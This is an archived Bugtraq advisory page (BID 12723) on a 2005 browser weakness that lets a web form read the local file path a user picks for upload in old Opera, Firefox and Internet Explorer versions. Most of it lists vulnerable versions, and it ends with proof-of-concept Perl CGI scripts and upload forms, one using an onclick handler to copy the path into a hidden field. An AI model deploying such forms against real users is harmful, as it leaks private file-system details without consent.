#SpeeDr00t@Black Falcon<br>#bid12723<p><b><span style="font-size: 18pt;">Multiple Browser Information Disclosure Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12723/info">info</a><br><a href="http://www.securityfocus.com/bid/12723/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12723/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12723/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12723/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				12723
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Feb 19 2005 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Feb 19 2005 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery is credited to upken.  Additional details were provided by bitlance winter.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Opera Software Opera Web Browser 7.54 <br/>
					
				
					Opera Software Opera Web Browser 7.53 <br/>
					
				
					Opera Software Opera Web Browser 7.52 <br/>
					
				
					Opera Software Opera Web Browser 7.51 <br/>
					
				
					Opera Software Opera Web Browser 7.50 <br/>
					
				
					Opera Software Opera Web Browser 7.23 <br/>
					
				
					Opera Software Opera Web Browser 7.22 <br/>
					
				
					Opera Software Opera Web Browser 7.21 <br/>
					
				
					Opera Software Opera Web Browser 7.20 Beta 1 build 2981<br/>
					
				
					Opera Software Opera Web Browser 7.20 <br/>
					
				
					Opera Software Opera Web Browser 7.11 j<br/>
					
				
					Opera Software Opera Web Browser 7.11 b<br/>
					
				
					Opera Software Opera Web Browser 7.11 <br/>
					
				
					Opera Software Opera Web Browser 7.10 <br/>
					
				
					Mozilla Firefox 1.0.1 <br/>
<span class="related">
						
							+ 
						
						Redhat Fedora  Core3<br/>
</span>
					
				
					Mozilla Firefox 1.0 <br/>
<span class="related">
						
							+ 
						
						Gentoo Linux  <br/>
</span>
<span class="related">
						
							+ 
						
						Gentoo Linux  <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.2 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.2 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.2 <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.2 <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.1 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.1 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.1 <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.1 <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.0 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.0 x86_64<br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.0 <br/>
</span>
<span class="related">
						
							+ 
						
						S.u.S.E. Linux Personal 9.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux 10.1 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux 10.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux 10.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux 9.1 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux 9.1 <br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux  -current<br/>
</span>
<span class="related">
						
							+ 
						
						Slackware Linux  -current<br/>
</span>
					
				
					Mozilla Firefox 0.10.1 <br/>
					
				
					Mozilla Firefox 0.10 <br/>
					
				
					Mozilla Firefox 0.9.3 <br/>
					
				
					Mozilla Firefox 0.9.2 <br/>
					
				
					Mozilla Firefox 0.9.1 <br/>
					
				
					Mozilla Firefox 0.9 rc<br/>
					
				
					Mozilla Firefox 0.9 <br/>
					
				
					Mozilla Firefox 0.8 <br/>
					
				
					Microsoft Internet Explorer  6.0 SP2 - do not use<br/>
					
				
					Microsoft Internet Explorer  6.0 SP1<br/>
					
				
					Microsoft Internet Explorer  6.0<br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Terminal Services  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows ME  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows ME  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows ME  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Enterprise Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Enterprise Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Enterprise Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Terminal Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Terminal Server  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Workstation  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Workstation  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT Workstation  4.0 SP6a<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following proof of concept is available:<br/><br/>Targeting Internet Explorer:<br/><br/>server-side Perl CGI.(ask.cgi)<br/>- ---------------------------<br/>#!/usr/bin/perl<br/>print "Content-Type: text/html\n\n";<br/><br/>die if $ENV{CONTENT_LENGTH} &gt; 100*1024;<br/><br/>$objectname = "RFC1867";<br/>$boundary = &lt;STDIN&gt;;<br/>$boundary =~s /\r\n//;<br/>while(&lt;STDIN&gt;){<br/> if($_ =~ /$objectname/){<br/>   ~s/\r\n//;<br/>   ~s/"//g;<br/>   @dum = split(/filename=/, $_);<br/>   $rfc1867 = $dum@dum - 1;<br/> }<br/>}<br/>&amp;Filtertxt( $rfc1867 );<br/>print "$rfc1867\n";<br/><br/>exit(0);<br/><br/>sub Filtertxt {<br/>   local( $ft ) = @_;<br/>   $fd =~ s/\&lt;\&gt;\"\'\%\;\)\(\&amp;\+//g;<br/>   return( $ft ) ;<br/>}<br/>- ---------------------------<br/><br/>client-side FORM.<br/>- ---------------------------<br/>&lt;form name="XA" method="POST" enctype="multipart/form-data"<br/>action="http://www.example.com/cgi-bin/ask.cgi"&gt;<br/>&lt;input type="file" name="RFC1867"&gt;<br/>&lt;input type="hidden" name="XB" value="HIDDEN"&gt;<br/>&lt;input type=submit value="Upload"&gt;<br/>&lt;/form&gt;<br/><br/>Targeting Internet Explorer and Opera:<br/><br/>server-side Perl CGI.(named ask2.cgi)<br/>- ---------------------------<br/>#!/usr/bin/perl<br/><br/>if($ENV{'REQUEST_METHOD'} eq 'POST'){<br/>#reads inputted variables through POST<br/>read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});<br/>}<br/>else{<br/>#reads inputted variables through GET<br/>$buffer = $ENV{'QUERY_STRING'};<br/>}<br/><br/>#splits the variables at &amp;<br/>@pairs = split(/&amp;/, $buffer);<br/>foreach $pair (@pairs) {<br/>#sets the value and name of each var<br/>($name, $value) = split(/=/, $pair);<br/>#makes each + into a space<br/>$value =~ tr/+/ /;<br/>#URL decode<br/>$value =~ s/%(a-fA-F0-9a-fA-F0-9)/pack("C", hex($1))/eg;<br/>#filter out bad characters &amp; # &lt; &gt; " '<br/>$value = &amp;Filtertxt( $value );<br/>#sets the varibles in a hash<br/>$FORM{$name} = $value;<br/>}<br/><br/>#print html .<br/>print "Content-Type: text/html\n";<br/>print "\n";<br/>print "$FORM{'XB'}\n";<br/>print "&lt;br&gt;\n";<br/>print "$FORM{'RFC1867'}\n";<br/><br/>exit(0);<br/><br/>sub Filtertxt {<br/>   local( $ft ) = @_;<br/>   $fd =~ s/\&lt;\&gt;\"\'\%\;\)\(\&amp;\+//g;<br/>   return( $ft ) ;<br/>}<br/>- ---------------------------<br/><br/>client-side FORM.<br/>- ---------------------------<br/>&lt;form name="XA" method="GET" enctype="multipart/form-data"<br/>action="http://www.example.com/cgi-bin/ask2.cgi"&gt;<br/>&lt;input type="file" name="RFC1867"&gt;<br/>&lt;input type="hidden" name="XB" value="HIDDEN"&gt;<br/>&lt;input type=submit value="Upload"&gt;<br/>&lt;/form&gt;<br/>- ---------------------------<br/><br/>Targeting Firefox, Internet Explorer and Opera:<br/><br/>server-side Perl CGI.(named ask2.cgi)<br/>- ---------------------------<br/>#!/usr/bin/perl<br/><br/>if($ENV{'REQUEST_METHOD'} eq 'POST'){<br/>#reads inputted variables through POST<br/>read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});<br/>}<br/>else{<br/>#reads inputted variables through GET<br/>$buffer = $ENV{'QUERY_STRING'};<br/>}<br/><br/>#splits the variables at &amp;<br/>@pairs = split(/&amp;/, $buffer);<br/>foreach $pair (@pairs) {<br/>#sets the value and name of each var<br/>($name, $value) = split(/=/, $pair);<br/>#makes each + into a space<br/>$value =~ tr/+/ /;<br/>#URL decode<br/>$value =~ s/%(a-fA-F0-9a-fA-F0-9)/pack("C", hex($1))/eg;<br/>#filter out bad characters &amp; # &lt; &gt; " '<br/>$value = &amp;Filtertxt( $value );<br/>#sets the varibles in a hash<br/>$FORM{$name} = $value;<br/>}<br/><br/>#print html .<br/>print "Content-Type: text/html\n";<br/>print "\n";<br/>print "$FORM{'XB'}\n";<br/>print "&lt;br&gt;\n";<br/>print "$FORM{'RFC1867'}\n";<br/><br/>exit(0);<br/><br/>sub Filtertxt {<br/>   local( $ft ) = @_;<br/>   $fd =~ s/\&lt;\&gt;\"\'\%\;\)\(\&amp;\+//g;<br/>   return( $ft ) ;<br/>}<br/>- ---------------------------<br/><br/>client-side FORM.<br/>- ---------------------------<br/>&lt;form name="XA" method="GET" enctype="multipart/form-data"<br/>action="http://www.example.com/cgi-bin/ask2.cgi"&gt;<br/>&lt;input type="file" name="RFC1867"&gt;<br/>&lt;input type="hidden" name="XB" value="HIDDEN"&gt;<br/>&lt;input type=submit value="Upload"<br/>onclick="document.XA.XB.value=document.XA.RFC1867.value;return true" &gt;<br/>&lt;/form&gt;<br/>- ---------------------------
	
		<ul>
</ul>
</div>